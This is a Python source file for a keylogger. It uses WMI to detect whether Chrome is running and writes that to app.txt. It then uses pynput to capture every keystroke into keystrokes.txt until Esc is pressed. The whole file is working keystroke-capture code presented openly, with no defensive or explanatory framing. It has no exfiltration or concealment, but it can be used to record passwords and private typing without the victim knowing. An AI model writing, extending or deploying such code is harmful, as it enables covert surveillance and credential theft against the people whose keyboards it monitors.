# this code is to implement the keylogger using the python with the help of libraries like pynput,wmi


import pynput
from pynput.keyboard import Key, Listener
import wmi

# the below function is used to start the wmi constructor
f = wmi.WMI()

App_visited = 0

# the below code is uses to find the running applications in the system
for App_pross in f.Win32_Process():
    if "chrome.exe" == App_pross.Name:
        print("chrome is Running")
        App_visited = 1
        appli2 = 'chrome is running'
        with open('app.txt', 'w') as frr:
            frr.write(appli2)
        break

if App_visited == 0:
    print("chrome is not Running")

Key_strokes = []


def key_press(key):
    Key_strokes.append(key)
    writting_in_file(Key_strokes)

    try:
        print('the keyboard key {0} pressed'.format(key.char))

    except AttributeError:
        print('the special key {0} pressed'.format(key))


# the below code is used to write key strokes pressed in the text file
def writting_in_file(Key_strokes):
    with open('keystrokes.txt', 'w') as file:
        for key in Key_strokes:
            r = str(key).replace("'", "")
            file.write(r)

            file.write('')


def key_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=key_press,
              on_release=key_release) as listener:
    listener.join()



